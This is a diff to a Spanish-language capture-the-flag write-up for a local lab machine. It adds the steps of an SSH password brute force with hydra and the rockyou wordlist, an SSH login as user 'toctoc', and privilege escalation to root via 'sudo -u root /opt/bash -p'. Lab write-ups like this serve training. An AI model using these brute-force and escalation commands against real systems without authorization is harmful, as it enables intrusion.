@@ -119,8 +119,35 @@ PORT   STATE SERVICE REASON
 Ahora utilizamos **hydra** con el usuario **toctoc** obtenido en el archivo txt, para con fuerza bruta descubrir la contraseña.
 
 ```
-hydra -l tocto -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
+hydra -l toctoc -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
 ```
+![image](https://github.com/user-attachments/assets/8b84f5e5-9528-4c1b-9643-c304376d5eff)
+
+Como hemos obtenido una contraseña, nos conectamos por ssh.
+```bash
+ssh toctoc@172.17.0.2
+```
+![image](https://github.com/user-attachments/assets/c2b615e2-42ad-4528-8b18-6987483ff1a6)
+
+## Escalada de privilegios.
+
+Comprobamos si hay algún binario que podamos explotar y nos encontramos con dos opciones.
+
+![image](https://github.com/user-attachments/assets/08908efd-3ecd-49bb-80d7-58499eda20b7)
+
+```bash
+sudo -u root /opt/bash -p
+```
+Ya tenemos acceso como **root**.
+
+![image](https://github.com/user-attachments/assets/d99869ef-ec35-4b98-8c21-bfdb13c2f684)
+
+
+
+
+
+
+
 
 
 
